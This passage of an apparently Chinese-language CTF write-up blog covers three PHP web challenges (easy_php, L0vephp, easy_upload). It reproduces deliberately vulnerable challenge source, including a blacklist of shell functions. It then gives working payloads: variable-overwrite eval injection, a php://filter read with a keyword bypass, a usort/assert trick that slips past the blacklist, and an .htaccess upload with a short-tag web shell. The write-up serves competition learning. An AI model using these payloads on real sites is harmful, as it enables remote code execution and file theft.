class="line"></span><br><span class="line">getVars();</span><br><span class="line">if (isset($source)) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//只有admin才能设置环境变量</span><br><span class="line">if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    echo &apos;you can set config variables!!&apos; . &apos;&lt;/br&gt;&apos;;</span><br><span class="line">    foreach (array_keys($GLOBALS) as $key) &#123;</span><br><span class="line">        if (preg_match(&apos;/var\d&#123;1,2&#125;/&apos;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123;</span><br><span class="line">            @eval(&quot;\$$key&quot; . &apos;=&quot;&apos; . $GLOBALS[$key] . &apos;&quot;;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    foreach (array_keys($GLOBALS) as $key) &#123;</span><br><span class="line">        if (preg_match(&apos;/var\d&#123;1,2&#125;/&apos;, $key)) &#123;</span><br><span class="line">            echo ($GLOBALS[$key]) . &apos;&lt;/br&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有明显的变量覆盖。$_GET全局变量的键值对会覆盖原有变量。这里自己设置一个password和对应的hash值即可。<br>sha1的部分需要爆破。或者自己网上查一查也可。但是感觉可以一次性跑完所有常用hash函数的结果保存备用，以后就快人一步。<br>想办法进到环境变量的设置里面，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?source=1&amp;verif=0e1290633704&amp;password=123456&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>
+<p>到这里就可以设置环境变量了，往下看。<br>需要注意一下在函数里定义的global变量，如果函数执行了就可以在全局范围内使用这个变量。这就是为什么password和verif变量可用。<br>接下来要利用eval来执行命令，这里要利用一下全局变量的覆盖来进行。<br>由于<code>if (preg_match(&#39;/var\d{1,2}/&#39;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12)</code>这个限制条件的存在，变量只能设置为var+数字的形式。<br>payload测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?var1=$_GET[1]&amp;var2=$&#123;$var1()&#125;&amp;1=phpinfo&amp;source=1&amp;verif=0e1290633704&amp;password=123456&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">模拟一下执行流程</span><br><span class="line">$var1 = $_GET[1]</span><br><span class="line">$var2 = $&#123;$var1()&#125; --&gt; $&#123;$_GET[1]()&#125; --&gt; $&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>需要注意的是，构造的时候，不能直接传phpinfo()，而是传了phpinfo，然后原来后边有括号等着调用</strong><br>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&amp;var1=$&#123;$a($b)&#125;&amp;a=system&amp;b=whoami&amp;source=1&amp;verif=0e1290633704&amp;password=123456&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>
+<p>关于复杂语法的解释，可以看这里<a href="https://www.chabug.org/ctf/425.html" target="_blank" rel="noopener">传送门</a><br>还有个非预期解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1=\&quot;;$a();?&gt;&amp;a=phpinfo</span><br></pre></td></tr></table></figure>
+<p>这里自己其实也有点想法，但是没构造出来(就是菜<br>)</p>
+<h2 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h2><p>这题有点脑洞的感觉<br>进去提示了读源码，两处注释，一个是flag还有一串base85编码的字符串(是的开眼了)<br>解码之后得到get action的提示。配合提示读源码，想到读取flag.php的文件<br>想直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aciont=php://filter/read=convert.base64_encode/sources=flag.php</span><br></pre></td></tr></table></figure>
+<p>发现提示了hacker。关键字慢慢减少回去，发现删掉base就可以，那就是过滤了base关键字。<br>查阅资料，发现这一篇文章<a href="https://www.anquanke.com/post/id/202510" target="_blank" rel="noopener">传送门</a><br>发现出了base64之外，这个也可以用<br><img src="https://i.loli.net/2020/11/23/ukKf9bTC5rXGBFn.png" alt="1.png"><br>于是payload改成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>再次查看源码，发现如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php=0A=0A$flag =3D &quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;;=0A=0A//hint:316E4433782E706870=0A?&gt;</span><br></pre></td></tr></table></figure>
+<p>后边的hint一看就是十六进制了。转换成字符串是1nD3x.php<br>访问一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$code=$_REQUEST[&apos;code&apos;];</span><br><span class="line"></span><br><span class="line">$_=array(&apos;@&apos;,&apos;\~&apos;,&apos;\^&apos;,&apos;\&amp;&apos;,&apos;\?&apos;,&apos;\&lt;&apos;,&apos;\&gt;&apos;,&apos;\*&apos;,&apos;\`&apos;,&apos;\+&apos;,&apos;\-&apos;,&apos;\&apos;&apos;,&apos;\&quot;&apos;,&apos;\\\\&apos;,&apos;\/&apos;); </span><br><span class="line">$__=array(&apos;eval&apos;,&apos;system&apos;,&apos;exec&apos;,&apos;shell_exec&apos;,&apos;assert&apos;,&apos;passthru&apos;,&apos;array_map&apos;,&apos;ob_start&apos;,&apos;create_function&apos;,&apos;call_user_func&apos;,&apos;call_user_func_array&apos;,&apos;array_filter&apos;,&apos;proc_open&apos;);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line">if (strlen($code)&gt;16)&#123;</span><br><span class="line">    die(&apos;Too long&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($blacklist1 as $blacklisted) &#123; </span><br><span class="line">    if (preg_match (&apos;/&apos; . $blacklisted . &apos;/m&apos;, $code)) &#123; </span><br><span class="line">        die(&apos;WTF???&apos;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">foreach ($blacklist2 as $blackitem) &#123;</span><br><span class="line">    if (preg_match (&apos;/&apos; . $blackitem . &apos;/im&apos;, $code)) &#123;</span><br><span class="line">        die(&apos;Sry,try again&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里想了一下，没想出来，看了wp，利用了php变长参数的特性</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>和Python中的**kwargs，类似，在PHP中可以使用 func(…$arr)这样的方式，将$arr数组展开成多个参数，传入func函数。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>最后参考这篇文章<a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">传送门</a><br><img src="https://i.loli.net/2020/11/23/DiWl1yFEHLtanCm.png" alt="1.png"><br>大致说一下这个过程，usort接受两个参数，第一个参数是一个数组，第二个是一个可调用的参数，callable。<br>这里…$_GET将GET数组展开为两个参数。<br><code>[&quot;test&quot;,&quot;system(&#39;ls /&#39;);&quot;]和assert</code><br>第二个参数assert会将数组的内容当作参数来调用自身。所以会执行<code>assert(&quot;system(&#39;ls /&#39;);&quot;)</code></p>
+<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>这道题也是不会的。一开始看到过滤，想着上传.htaccess。但是又过滤了php，auto等关键字，我没辙了。<br>查看wp，发现用换行拼接的方式来绕过关键字的过滤<br>首先上传.htaccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .ppt</span><br></pre></td></tr></table></figure>
+<p>没错就是这么简单，我就是这么菜居然不会，我愧对教我绕waf的师傅(这种技巧其实实战也用得上)<br>既然已经成功上传配置文件，接下来就是上传一个ppt文件，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=system(&apos;cat /flag&apos;);</span><br></pre></td></tr></table></figure>
+<p>利用短标签来绕过关键字的过滤。<br>还有一种思路是上传.htaccess文件来打开cgi脚本，然后再上传cgi脚本，但是我没有复现成功，就不写了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/11/2020-hackergame/" rel="next" title="2020_hackergame">
+                <i class="fa fa-chevron-left"></i> 2020_hackergame
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/11/18/ctf-hash/" rel="prev" title="ctf_hash">
+                ctf_hash <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-ssrf"><span class="nav-number">1.</span> <span class="nav-text">easy_ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyunserialize"><span class="nav-number">2.</span> <span class="nav-text">easyunserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyeval"><span class="nav-number">3.</span> <span class="nav-text">babyeval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eaphp"><span class="nav-number">4.</span> <span class="nav-text">eaphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyflask"><span class="nav-number">5.</span> <span class="nav-text">easyflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezfind"><span class="nav-number">6.</span> <span class="nav-text">ezfind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-sql"><span class="nav-number">7.</span> <span class="nav-text">easy_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UN’s-online-tools"><span class="nav-number">8.</span> <span class="nav-text">UN’s_online_tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-php"><span class="nav-number">9.</span> <span class="nav-text">easy_php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#L0vephp"><span class="nav-number">10.</span> <span class="nav-text">L0vephp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-upload"><span class="nav-number">11.</span> <span class="nav-text">easy_upload</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">112.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
